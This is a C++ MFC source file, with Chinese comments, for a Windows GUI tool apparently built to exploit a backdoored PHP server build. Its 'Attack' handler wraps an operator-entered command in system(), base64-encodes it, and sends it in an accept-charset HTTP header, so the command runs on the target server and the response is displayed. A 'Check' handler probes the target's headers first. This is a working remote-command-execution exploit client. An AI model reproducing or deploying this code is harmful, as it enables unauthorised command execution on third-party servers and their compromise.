
// PhpShellCmdDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "PhpShellCmd.h"
#include "PhpShellCmdDlg.h"
#include "afxdialogex.h"
#include "base64.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CPhpShellCmdDlg 对话框



CPhpShellCmdDlg::CPhpShellCmdDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CPhpShellCmdDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CPhpShellCmdDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_CMD, m_editCmd);
	DDX_Control(pDX, IDC_EDIT_OUTPUT, m_output);
	DDX_Control(pDX, IDC_EDIT_ADDRESS, m_adress);
}

BEGIN_MESSAGE_MAP(CPhpShellCmdDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BTN_ATTACK, &CPhpShellCmdDlg::OnBnClickedBtnAttack)
	ON_BN_CLICKED(IDC_BTN_CHECK, &CPhpShellCmdDlg::OnBnClickedBtnCheck)
END_MESSAGE_MAP()


// CPhpShellCmdDlg 消息处理程序

BOOL CPhpShellCmdDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO:  在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CPhpShellCmdDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CPhpShellCmdDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CPhpShellCmdDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


//此处的引入影响到后面的IWinHttpRequestPtr，必须在其前面否则报错，两个按钮都需要
#import "C:\windows\system32\winhttpcom.dll" no_namespace
//检测对方服务器是否存在PHP5.4.45后门漏洞
void CPhpShellCmdDlg::OnBnClickedBtnCheck()
{
	//从地址栏获取地址
	CString strAdress;
	m_adress.GetWindowTextW(strAdress);
	BSTR bstrAdress = strAdress.AllocSysString();	//将CSTRING转换为BSTR类型，方便后面SetRequestHeader的设置

	//当输入的地址无效时可以使用trycatch捕获异常防止程序报错
	CoInitialize(NULL);		//对com组件初始化，在使用com组件时必须初始化，否则空谈

	try{
		IWinHttpRequestPtr pHttpReq = NULL;		//定义智能指针对象,在接口IWinHttpRequest后加Ptr 
		HRESULT hr = pHttpReq.CreateInstance(__uuidof(WinHttpRequest));	//实例化winhttp组件，这里使用的是点，使用-》调用的是之智能指针类型的方法，用点调用的是智能指针的方法。第一个参数类的id（类名）
		if (FAILED(hr)) return;

		hr = pHttpReq->Open(_T("GET"), bstrAdress);
		if (FAILED(hr)){
			CoUninitialize();
			return;
		}

		//pHttpReq->SetRequestHeader(_T("Referer"),_T("http://192.168.1.236/"));	//当返回码为403即网站是防止倒链时可以使用此段代码破解倒链

		hr = pHttpReq->Send();
		if (FAILED(hr)){
			CoUninitialize();
			return;
		}

		long code = pHttpReq->Status;		//判断返回码看连接的状态


		//_bstr_t bStrText = pHttpReq->ResponseText;
		//CString strText = bStrText;

		//解决中文乱码问题
	/*	_variant_t varRspBody = pHttpReq->GetResponseBody();
		ULONG dataLen = varRspBody.parray->rgsabound[0].cElements;
		char *pContentBuffer = (char *)varRspBody.parray->pvData;
		CString strCntBuffer;
		strCntBuffer = pContentBuffer;*/

		_bstr_t bStrText = pHttpReq->GetAllResponseHeaders();//返回文件头信息
		CString strText = bStrText;

		m_output.SetWindowTextW(strText);
	}
	catch (...){		//...是最大的捕获异常，无法知道出现的是什么异常
		MessageBox(_T("输入地址无效"));
	}

	//使用了智能指针没有调用pHttpReq->Release();，它会自动调用
	CoUninitialize();
}

//对目标服务器进行攻击
void CPhpShellCmdDlg::OnBnClickedBtnAttack()
{
//从地址栏获取地址
	CString strAdress;
	m_adress.GetWindowTextW(strAdress);
	BSTR bstrAdress = strAdress.AllocSysString();	//将CSTRING转换为BSTR类型，方便后面SetRequestHeader的设置


//从cmd编辑框获得cmd转换为base64编码的命令
	//从编辑框获得输入的cmd，加入system函数
	CString str;  
	m_editCmd.GetWindowTextW(str);
	string strCmd = L"system('" + str + "');";
	//m_output.SetWindowTextW(strCmd);

	//使用boost库中的base64接口来进行cmd的编码
	string base64_str;
	base64 base;
	base.Base64Encode(strCmd, &base64_str);//此时已经编码成功了，输出为base64_str

	//将已经编码后的string类型转换并输出
	CString base64_str2;
	base64_str2 = base64_str.c_str();
	//m_output.SetWindowTextW(base64_str2);	此处不用输出
	BSTR bstrBase64 = base64_str2.AllocSysString();	//将CSTRING转换为BSTR类型，方便后面SetRequestHeader的设置

//将前面获得的base64编码后的命令输入到下面
	//当输入的地址无效时可以使用trycatch捕获异常防止程序报错
	CoInitialize(NULL);		//对com组件初始化，在使用com组件时必须初始化，否则空谈

	try{
		IWinHttpRequestPtr pHttpReq = NULL;		//定义智能指针对象,在接口IWinHttpRequest后加Ptr 
		HRESULT hr = pHttpReq.CreateInstance(__uuidof(WinHttpRequest));	//实例化winhttp组件，这里使用的是点，使用-》调用的是之智能指针类型的方法，用点调用的是智能指针的方法。第一个参数类的id（类名）
		if (FAILED(hr)) return;

		hr = pHttpReq->Open(_T("GET"), bstrAdress);
		if (FAILED(hr)){
			CoUninitialize();
			return;
		}

		//pHttpReq->SetRequestHeader(_T("Referer"),_T("http://192.168.1.236/"));	//当返回码为403即网站是防止倒链时可以使用此段代码破解倒链
		pHttpReq->SetRequestHeader(_T("Accept-Encoding"), _T("gzip,deflate"));
		pHttpReq->SetRequestHeader(_T("accept-charset"), bstrBase64);

		hr = pHttpReq->Send();
		if (FAILED(hr)){
			CoUninitialize();
			return;
		}

		long code = pHttpReq->Status;		//判断返回码看连接的状态


		//_bstr_t bStrText = pHttpReq->ResponseText;
		//CString strText = bStrText;

		//解决中文乱码问题
		_variant_t varRspBody = pHttpReq->GetResponseBody();
		ULONG dataLen = varRspBody.parray->rgsabound[0].cElements;
		char *pContentBuffer = (char *)varRspBody.parray->pvData;
		CString strCntBuffer;
		strCntBuffer = pContentBuffer;

		m_output.SetWindowTextW(strCntBuffer);
	}
	catch (...){		//...是最大的捕获异常，无法知道出现的是什么异常
		MessageBox(_T("输入地址无效"));
	}

	//使用了智能指针没有调用pHttpReq->Release();，它会自动调用
	CoUninitialize();

}


